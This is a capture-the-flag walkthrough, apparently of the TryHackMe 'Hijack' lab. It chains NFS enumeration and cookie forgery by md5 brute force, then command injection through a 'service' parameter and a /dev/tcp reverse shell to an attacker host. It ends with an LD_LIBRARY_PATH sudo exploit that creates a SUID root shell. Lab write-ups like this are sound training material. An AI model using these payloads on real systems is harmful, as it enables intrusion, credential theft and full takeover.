🛠️ Hijack – Full Walkthrough (With Outputs)
🎯 Objective

Gain initial access, escalate privileges, and capture:

User flag
Root flag
🔍 1. Reconnaissance
Nmap Scan
nmap -sC -sV -p- <TARGET_IP>
Output
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp   open  http    Apache httpd 2.4.18
111/tcp  open  rpcbind
2049/tcp open  nfs

👉 NFS detected → interesting attack surface

📂 2. NFS Enumeration
showmount -e <TARGET_IP>
Output
Export list for <TARGET_IP>:
/mnt/share *
Mount Share
sudo mkdir /tmp/nfs
sudo mount -t nfs <TARGET_IP>:/mnt/share /tmp/nfs
Access as NFS user
sudo su nfsuser
cd /tmp/nfs
ls -la
Output
total 8
drwx------  2 nfsuser nfsuser 4096 Aug  8  2023 .
drwxrwxrwt 16 root    root     380 Mar 25 ...
-rwx------  1 nfsuser nfsuser   46 Aug  8  2023 for_employees.txt
Extract credentials
cat for_employees.txt
Output
ftp creds :

ftpuser:<REDACTED>
📡 3. FTP Access
ftp <TARGET_IP>
Output
220 (vsFTPd 3.0.3)
Name: ftpuser
Password: <REDACTED>
230 Login successful.
List files
ls
Output
.from_admin.txt
.passwords_list.txt
Admin message
cat .from_admin.txt
Output
admin recommends using passwords from the list
brute force protection enabled
🌐 4. Web Enumeration
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
Output
/login.php           (Status: 200)
/signup.php          (Status: 200)
/administration.php  (Status: 200)
/config.php          (Status: 200)
🍪 5. Cookie Analysis

After login attempt:

curl -i http://<TARGET_IP>/login.php
Observation
Set-Cookie: PHPSESSID=<BASE64>

Decoded format:

username:md5(password)

👉 Vulnerability: client-side authentication

💥 6. Admin Access (Cookie Forgery)
while read -r p; do
  h=$(printf '%s' "$p" | md5sum | awk '{print $1}')
  c=$(printf "admin:$h" | base64 -w0)

  out=$(curl -s -b "PHPSESSID=$c" http://<TARGET_IP>/administration.php)

  if ! echo "$out" | grep -q "Access denied"; then
    echo "[+] VALID PASSWORD FOUND"
    break
  fi
done < passwords.txt
Output
[+] VALID PASSWORD FOUND
🧪 7. Command Injection
curl -s -b "PHPSESSID=<cookie>" \
  --data-urlencode 'service=ssh&&id' \
  --data-urlencode 'submit=Execute' \
  http://<TARGET_IP>/administration.php
Output
uid=33(www-data) gid=33(www-data)

👉 RCE confirmed

🐚 8. Reverse Shell
nc -lvnp 4444
Payload
service=ssh
bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
Output
connect to [ATTACKER_IP] from <TARGET_IP>
www-data@Hijack:/$
🧑‍💻 9. Shell Upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
🔍 10. Credential Discovery
cd /var/www/html
cat config.php
Output
$username = "rick";
$password = "<REDACTED>";
🔑 11. User Access
su rick
Output
Password: <REDACTED>
rick@Hijack:/var/www/html$
🏁 12. User Flag
cat /home/rick/user.txt
Output
THM{***************}
🚀 13. Privilege Escalation
sudo -l
Output
User rick may run the following commands:
(root) /usr/sbin/apache2 ...
env_keep+=LD_LIBRARY_PATH

👉 Vulnerable

💣 14. Root Exploit
Compile payload
gcc -fPIC -shared -o /tmp/libaprutil-1.so.0 pwn.c
Execute
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
Check SUID shell
ls -l /tmp/rootbash
Output
-rwsr-xr-x 1 root root ... /tmp/rootbash
👑 15. Root Access
/tmp/rootbash -p
whoami
Output
root
🏁 16. Root Flag
cat /root/root.txt
Output
THM{***************}
